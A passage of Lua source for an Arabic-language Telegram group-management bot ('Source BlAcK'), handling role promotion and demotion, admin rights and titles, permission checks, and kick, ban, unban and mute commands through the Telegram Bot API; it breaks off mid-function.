if text and text:match('^رفع منظف @(.*)') and SourceCh(msg) then
local username = text:match('^رفع منظف @(.*)')
function promreply(extra,result,success)
if not JokerConstructor(msg) and DevJoker:get(BlAcK.."Joker:Lock:ProSet"..msg.chat_id_) then 
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
if result.id_ then
DevJoker:sadd(BlAcK..'Joker:Cleaner:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم رفعه في قائمة المنظفين")  
else 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع منظف (%d+)') and SourceCh(msg) then
local user = text:match('رفع منظف (%d+)')
if not JokerConstructor(msg) and DevJoker:get(BlAcK.."Joker:Lock:ProSet"..msg.chat_id_) then 
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevJoker:sadd(BlAcK..'Joker:Cleaner:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","᥀︙تم رفعه في قائمة المنظفين")  
end
--     Source BlAcK     --
--       Rem Cleaner      --
if text ==('تنزيل منظف') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevJoker:srem(BlAcK..'Joker:Cleaner:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم تنزيله من قائمة المنظفين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منظف @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل منظف @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevJoker:srem(BlAcK..'Joker:Cleaner:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم تنزيله من قائمة المنظفين")  
else 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل منظف (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل منظف (%d+)')
DevJoker:srem(BlAcK..'Joker:Cleaner:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","᥀︙تم تنزيله من قائمة المنظفين")  
end end
--     Source BlAcK     --
--       Set admin        --
if Manager(msg) then
if text ==('رفع ادمن') and SourceCh(msg) then
function prom_reply(extra, result, success)
if not JokerConstructor(msg) and DevJoker:get(BlAcK.."Joker:Lock:ProSet"..msg.chat_id_) then 
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevJoker:sadd(BlAcK..'Joker:Admins:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم رفعه في قائمة الادمنيه")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع ادمن @(.*)') and SourceCh(msg) then
local username = text:match('^رفع ادمن @(.*)')
function promreply(extra,result,success)
if not JokerConstructor(msg) and DevJoker:get(BlAcK.."Joker:Lock:ProSet"..msg.chat_id_) then 
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
if result.id_ then
DevJoker:sadd(BlAcK..'Joker:Admins:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم رفعه في قائمة الادمنيه")  
else 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع ادمن (%d+)') and SourceCh(msg) then
local user = text:match('رفع ادمن (%d+)')
if not JokerConstructor(msg) and DevJoker:get(BlAcK.."Joker:Lock:ProSet"..msg.chat_id_) then 
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevJoker:sadd(BlAcK..'Joker:Admins:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","᥀︙تم رفعه في قائمة الادمنيه")  
end
--     Source BlAcK     --
--        Rem admin       --
if text ==('تنزيل ادمن') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevJoker:srem(BlAcK..'Joker:Admins:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم تنزيله من قائمة الادمنيه")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل ادمن @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل ادمن @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevJoker:srem(BlAcK..'Joker:Admins:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم تنزيله من قائمة الادمنيه")  
else 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل ادمن (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل ادمن (%d+)')
DevJoker:srem(BlAcK..'Joker:Admins:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","᥀︙تم تنزيله من قائمة الادمنيه")  
end end
--     Source BlAcK     --
--       Set Vipmem       --
if Admin(msg) then
if text ==('رفع مميز') and SourceCh(msg) then
function prom_reply(extra, result, success)
if not JokerConstructor(msg) and DevJoker:get(BlAcK.."Joker:Lock:ProSet"..msg.chat_id_) then 
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevJoker:sadd(BlAcK..'Joker:VipMem:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم رفعه في قائمة المميزين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع مميز @(.*)') and SourceCh(msg) then
local username = text:match('^رفع مميز @(.*)')
function promreply(extra,result,success)
if not JokerConstructor(msg) and DevJoker:get(BlAcK.."Joker:Lock:ProSet"..msg.chat_id_) then 
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
if result.id_ then
DevJoker:sadd(BlAcK..'Joker:VipMem:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم رفعه في قائمة المميزين")  
else 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مميز (%d+)') and SourceCh(msg) then
local user = text:match('رفع مميز (%d+)')
if not JokerConstructor(msg) and DevJoker:get(BlAcK.."Joker:Lock:ProSet"..msg.chat_id_) then 
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevJoker:sadd(BlAcK..'Joker:VipMem:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","᥀︙تم رفعه في قائمة المميزين")  
end
--     Source BlAcK     --
--       Rem Vipmem       --
if text ==('تنزيل مميز') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevJoker:srem(BlAcK..'Joker:VipMem:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم تنزيله من قائمة المميزين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مميز @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل مميز @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevJoker:srem(BlAcK..'Joker:VipMem:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم تنزيله من قائمة المميزين")  
else 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مميز (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل مميز (%d+)')
DevJoker:srem(BlAcK..'Joker:VipMem:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","᥀︙تم تنزيله من قائمة المميزين")  
end end 
--     Source BlAcK     --
if JokerConstructor(msg) then
if text and text:match("^رفع مشرف$") and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..BlAcK)
local GetInfo = JSON.decode(Check)
if GetInfo.result.can_promote_members == true then 
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم رفعه مشرف في المجموعه")  
else
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙ليست لدي صلاحية اضافة مشرفين جدد يرجى التحقق من الصلاحيات', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text and text:match("^تنزيل مشرف$") and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..BlAcK)
local GetInfo = JSON.decode(Check)
if GetInfo.result.can_promote_members == true then 
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم تنزيله من مشرفين المجموعه")  
else
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙ليست لدي صلاحية اضافة مشرفين جدد يرجى التحقق من الصلاحيات', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end 
if text and (text:match("^رفع بكل الصلاحيات$") or text:match("^رفع بكل صلاحيات$")) and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..BlAcK)
local GetInfo = JSON.decode(Check)
if GetInfo.result.can_promote_members == true then 
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم رفعه مشرف في جميع الصلاحيات")  
else
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙ليست لدي صلاحية اضافة مشرفين جدد يرجى التحقق من الصلاحيات', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text and (text:match("^وضع لقب (.*)$") or text:match("^رفع مشرف (.*)$") or text:match("^ضع لقب (.*)$")) and ChCheck(msg) then
local Joker = text:match("^وضع لقب (.*)$") or text:match("^رفع مشرف (.*)$") or text:match("^ضع لقب (.*)$")
function ReplySet(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..BlAcK)
local GetInfo = JSON.decode(Check)
if GetInfo.result.can_promote_members == true then 
https.request("https://api.telegram.org/bot"..TokenBot.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم اضافة ↫ "..Joker.." كلقب له")  
https.request("https://api.telegram.org/bot"..TokenBot.."/setChatAdministratorCustomTitle?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.."&custom_title="..Joker)
else
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙ليست لدي صلاحية اضافة مشرفين جدد يرجى التحقق من الصلاحيات', 1, 'md')
end
end
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ReplySet)
end
end
end
if text == 'لقبه' and ChCheck(msg) then
function ReplyGet(extra, result, success)
if GetCustomTitle(msg.sender_user_id_,msg.chat_id_) == false then
send(msg.chat_id_, msg.id_,'᥀︙ليس لديه لقب هنا') 
else
send(msg.chat_id_, msg.id_,'᥀︙لقبه ↫ '..GetCustomTitle(result.sender_user_id_,msg.chat_id_)) 
end
end
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ReplyGet)
end
end
if text == 'لقبي' and ChCheck(msg) then
if GetCustomTitle(msg.sender_user_id_,msg.chat_id_) == false then
send(msg.chat_id_, msg.id_,'᥀︙ليس لديك لقب هنا') 
else
send(msg.chat_id_, msg.id_,'᥀︙لقبك ↫ '..GetCustomTitle(msg.sender_user_id_,msg.chat_id_)) 
end
end
if text == "راسلني" and ChCheck(msg) then
BlAcKTeam = {"ها هلاو","انطق","كول","تفضل","احبك","عمري","لاف"};
send(msg.sender_user_id_, 0,BlAcKTeam[math.random(#BlAcKTeam)])
end
--     Source BlAcK     --
if text == "صلاحيتي" or text == "صلاحياتي" and ChCheck(msg) then 
if tonumber(msg.reply_to_message_id_) == 0 then 
Validity(msg,msg.sender_user_id_)
end end
if text ==('صلاحيته') or text ==('صلاحياته') and ChCheck(msg) then
function ValidityReply(extra, result, success)
Validity(msg,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ValidityReply)
end end
if text and (text:match('^صلاحيته @(.*)') or text:match('^صلاحياته @(.*)')) and ChCheck(msg) then
local username = text:match('^صلاحيته @(.*)') or text:match('^صلاحياته @(.*)')
function ValidityUser(extra,result,success)
if result.id_ then
Validity(msg,result.id_) 
else 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,ValidityUser)
end
if text and (text:match('^صلاحيته (%d+)') or text:match('^صلاحياته (%d+)')) and ChCheck(msg) then
local ValidityId = text:match('صلاحيته (%d+)') or text:match('صلاحياته (%d+)')
Validity(msg,ValidityId)  
end
--     Source BlAcK     --
if Admin(msg) then
if msg.reply_to_message_id_ ~= 0 then
if text and (text:match("^مسح$") or text:match("^حذف$") or text:match("^↫ اخفاء الكيبورد ᥀$")) and ChCheck(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.reply_to_message_id_})
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end end end
--     Source BlAcK     --
if JokerConstructor(msg) then
if text == "تفعيل الحظر" and ChCheck(msg) and SourceCh(msg) or text == "تفعيل الطرد" and ChCheck(msg) and SourceCh(msg) then
DevJoker:del(BlAcK.."Joker:Lock:KickBan"..msg.chat_id_)
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل الطرد والحظر'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
end
if text == "تعطيل الحظر" and ChCheck(msg) and SourceCh(msg) or text == "تعطيل الطرد" and ChCheck(msg) and SourceCh(msg) then
DevJoker:set(BlAcK.."Joker:Lock:KickBan"..msg.chat_id_,"true")
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل الطرد والحظر'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
end
if text == "تفعيل الكتم" and ChCheck(msg) and SourceCh(msg) or text == "تفعيل التقييد" and ChCheck(msg) and SourceCh(msg) then
DevJoker:del(BlAcK.."Joker:Lock:MuteTked"..msg.chat_id_)
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل الكتم والتقيد'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
end
if text == "تعطيل الكتم" and ChCheck(msg) and SourceCh(msg) or text == "تعطيل التقييد" and ChCheck(msg) and SourceCh(msg) then
DevJoker:set(BlAcK.."Joker:Lock:MuteTked"..msg.chat_id_,"true")
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل الكتم والتقيد'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
end
end
if JokerConstructor(msg) then
if text == "تفعيل الرفع" and ChCheck(msg) and SourceCh(msg) or text == "تفعيل الترقيه" and ChCheck(msg) and SourceCh(msg) then
DevJoker:del(BlAcK.."Joker:Lock:ProSet"..msg.chat_id_)
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم تعطيل رفع ↫ المنشئ الاساسي • المنشئ • المدير • الادمن • المميز', 1, 'md')
end
if text == "تعطيل الرفع" and ChCheck(msg) and SourceCh(msg) or text == "تعطيل الترقيه" and ChCheck(msg) and SourceCh(msg) then
DevJoker:set(BlAcK.."Joker:Lock:ProSet"..msg.chat_id_,"true")
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم تعطيل رفع ↫ المنشئ الاساسي • المنشئ • المدير • الادمن • المميز', 1, 'md')
end
end
--     Source BlAcK     --
--          Kick          --
if Admin(msg) then
if text ==('طرد') and ChCheck(msg) and SourceCh(msg) then
function KickReply(extra, result, success)
if not JokerConstructor(msg) and DevJoker:get(BlAcK.."Joker:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'᥀︙لقد تم تعطيل الطرد والحظر من قبل مالك المجموعه')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙لا تستطيع طرد ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"᥀︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"᥀︙لا استطيع طرد مشرفين المجموعه") 
return false  
end
ChatKick(result.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم طرده من المجموعه")  
end,nil)
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),KickReply)
end end
if text and text:match('^طرد @(.*)') and ChCheck(msg) and SourceCh(msg) then
local username = text:match('^طرد @(.*)')
function KickUser(extra,result,success)
if not JokerConstructor(msg) and DevJoker:get(BlAcK.."Joker:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'᥀︙لقد تم تعطيل الطرد والحظر من قبل مالك المجموعه')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙لا تستطيع طرد ↫ '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"᥀︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"᥀︙لا استطيع طرد مشرفين المجموعه") 
return false  
end
ChatKick(msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم طرده من المجموعه")  
end,nil)
end
else 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,KickUser)
end
if text and text:match('^طرد (%d+)') and ChCheck(msg) and SourceCh(msg) then
local user = text:match('طرد (%d+)')
if not JokerConstructor(msg) and DevJoker:get(BlAcK.."Joker:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'᥀︙لقد تم تعطيل الطرد والحظر من قبل مالك المجموعه')
return false
end
if RankChecking(user, msg.chat_id_) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙لا تستطيع طرد ↫ '..IdRank(user, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=user,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"᥀︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"᥀︙لا استطيع طرد مشرفين المجموعه") 
return false  
end
ChatKick(msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","᥀︙تم طرده من المجموعه")  
end,nil)
end
end
end 
--     Source BlAcK     --
--          Ban           --
if Admin(msg) then
if text ==('حضر') or text ==('حظر') and ChCheck(msg) and SourceCh(msg) then
function BanReply(extra, result, success)
if not JokerConstructor(msg) and DevJoker:get(BlAcK.."Joker:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'᥀︙لقد تم تعطيل الطرد والحظر من قبل مالك المجموعه')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙لا تستطيع حظر ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"᥀︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"᥀︙لا استطيع حظر مشرفين المجموعه") 
return false  
end
ChatKick(result.chat_id_, result.sender_user_id_)
DevJoker:sadd(BlAcK..'Joker:Ban:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم حظره من المجموعه") 
end,nil) 
end 
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),BanReply)
end end
if text and (text:match('^حضر @(.*)') or text:match('^حظر @(.*)')) and ChCheck(msg) and SourceCh(msg) then
local username = text:match('^حضر @(.*)') or text:match('^حظر @(.*)')
function BanUser(extra,result,success)
if not Constructor(msg) and DevJoker:get(BlAcK.."Joker:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'᥀︙لقد تم تعطيل الطرد والحظر من قبل مالك المجموعه')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙لا تستطيع حظر ↫ '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"᥀︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"᥀︙لا استطيع حظر مشرفين المجموعه") 
return false  
end
ChatKick(msg.chat_id_, result.id_)
DevJoker:sadd(BlAcK..'Joker:Ban:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم حظره من المجموعه")  
end,nil) 
end
else 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,BanUser)
end
if text and (text:match('^حضر (%d+)') or text:match('^حظر (%d+)')) and ChCheck(msg) and SourceCh(msg) then
local user = text:match('حضر (%d+)') or text:match('حظر (%d+)')
if not JokerConstructor(msg) and DevJoker:get(BlAcK.."Joker:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'᥀︙لقد تم تعطيل الطرد والحظر من قبل مالك المجموعه')
return false
end
if RankChecking(user, msg.chat_id_) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙لا تستطيع حظر ↫ '..IdRank(user, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=user,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"᥀︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"᥀︙لا استطيع حظر مشرفين المجموعه") 
return false  
end
ChatKick(msg.chat_id_, user)
DevJoker:sadd(BlAcK..'Joker:Ban:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","᥀︙تم حظره من المجموعه")  
end,nil) 
end
end
--     Source BlAcK     --
--         UnBan          --
if text ==('الغاء الحظر') or text ==('الغاء حظر') and ChCheck(msg) then
function UnBanReply(extra, result, success)
DevJoker:srem(BlAcK..'Joker:Ban:'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم الغاء حظره من المجموعه")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnBanReply)
end end
if text and (text:match('^الغاء الحظر @(.*)') or text:match('^الغاء حظر @(.*)')) and ChCheck(msg) then
local username = text:match('^الغاء الحظر @(.*)') or text:match('^الغاء حظر @(.*)')
function UnBanUser(extra,result,success)
if result.id_ then
DevJoker:srem(BlAcK..'Joker:Ban:'..msg.chat_id_, result.id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
ReplyStatus(msg,result.id_,"Reply","᥀︙تم الغاء حظره من المجموعه")  
else 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,UnBanUser)
end
if text and (text:match('^الغاء الحظر (%d+)') or text:match('^الغاء حظر (%d+)')) and ChCheck(msg) then
local user = text:match('الغاء الحظر (%d+)') or text:match('الغاء حظر (%d+)')
DevJoker:srem(BlAcK..'Joker:Ban:'..msg.chat_id_, user)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = user, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
ReplyStatus(msg,user,"Reply","᥀︙تم الغاء حظره من المجموعه")  
end 
end 
--     Source BlAcK     --
--          Mute          --
if Admin(msg) then
if text ==('كتم') and ChCheck(msg) then
function MuteReply(extra, result, success)
if not JokerConstructor(msg) and DevJoker:get(BlAcK.."Joker:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'᥀︙لقد تم تعطيل الكتم والتقيد')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙لا تستطيع كتم ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
